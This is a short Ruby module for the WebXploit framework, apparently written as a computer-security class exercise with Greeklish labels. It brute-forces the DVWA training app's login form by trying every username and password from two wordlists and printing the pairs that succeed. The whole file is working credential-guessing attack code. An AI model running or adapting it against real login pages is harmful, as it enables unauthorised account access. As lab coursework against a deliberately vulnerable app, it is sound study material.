class WebXploit < WXf::WXfmod_Factory::Auxiliary
  include WXf::WXfassists::General::MechReq

def initialize
  super(
   'Name'        => 'Vag Example',
   'Version'     => '1.0',
   'Description' => %q{
    Ergasia Computer Security
                    },
   'References'  =>
    [
    ['URL', '']
    ],
   'Author'      => [ 'Vagelis Aidonopoulos' ],
   'License'     => WXF_LICENSE
  )

  init_opts([
   OptString.new('RURL', [true, "URL tou DVWA Brute Force", ""]),
   OptString.new('USERL', [true, "Path kai filename gia usernames list", ""]),
   OptString.new('PSWDL', [true, "Path kai filename gia password list", ""]),
   OptBool.new('VALPSWD', [ true, 'Deixe MONO ta password pou einai valid', false ])
  ])

end

def run
 string = "\n username - password\n *********************"
        
 if(datahash['VALPSWD']==true)
  puts "Perimenete kathws dokimazontai oi syndiasmoi\n 8a xreiastei ligh wra analoga me ton ari8mo tv"
end

  fname = datahash['USERL']
  user = File.new(fname, "r")
  user.each do |user| 
  user = user.strip

  fname = datahash['PSWDL']
  pass = File.new(fname, "r")
  pass.each do |pass| 
  pass = pass.strip

  parameters = "username=#{user}&password=#{pass}&Login=Login"  
 
  res = mech_req({
    'RURL' => rurl,
    'method' => 'POST',
    'RPARAMS' => parameters ,
    'HEADERS' => {'Content-Type'=> "application/x-www-form-urlencoded"} 
  })

if(res.body =~ /You have/)
  prnt_plus(user+ " - " + pass)
  string = string + "\n #{user} - #{pass}"
else
  if(datahash['VALPSWD']==false)
  puts user + " - " + pass
  end 
end

end 
end 
prnt_plus(string + "\n *********************")
end 
end 